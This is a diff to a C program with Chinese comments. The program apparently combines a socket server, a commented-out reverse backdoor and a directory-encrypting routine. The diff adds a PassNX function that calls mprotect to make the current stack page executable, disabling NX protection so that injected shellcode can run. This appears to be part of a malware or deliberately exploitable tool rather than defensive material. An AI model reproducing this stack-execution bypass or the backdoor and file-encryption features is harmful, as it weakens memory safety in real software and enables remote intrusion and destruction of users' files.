@@ -1,8 +1,10 @@
 #include <stdio.h>
+#include <errno.h>
 #include <unistd.h>
 #include <string.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <sys/mman.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <netdb.h>
@@ -55,6 +57,9 @@ int EncryptDirector(void) ;
 // 加密单个文件
 int Encrypt(char *path, char enkey) ;
 
+// 为指定内存设置为可读，可写，可执行权限
+int PassNX(void) ;
+
 // 开始多线程的情况下处理函数
 static void DataHandle(void * sock_fd) ;   //Only can be seen in the file
 
@@ -98,6 +103,7 @@ int main(int argc, char **argv)
 #endif
     //ReverseBackdoor() ;
     //EncryptDirector() ;
+
     StartServer() ;
     
     return 0 ;
@@ -340,6 +346,22 @@ int Encrypt(char *path, char enkey)
     fclose(infile) ;
     fclose(outfile) ;
     return 0;
+}
+
+// 将当前栈内存设置为可读，可写，可执行权限
+int PassNX(void)
+{
+    int nError = 0 ;
+    nError = mprotect((void *)((unsigned long long)&nError &(~0XFFFUL)), 
+                    0x1000 - 1, 
+                    PROT_READ | PROT_WRITE | PROT_EXEC) ;
+    printf("PassNX Result: %d \n", nError) ;
+    if(0 != nError)
+    {
+        perror(strerror(errno)) ;
+        printf("&nError:%lp\n align:%lp\n", (unsigned long long)&nError, ((unsigned long long)&nError &(~0XFFFUL))) ;
+    }
+    return 0 ;
 }
 
 void DataHandle(void * sock_fd)
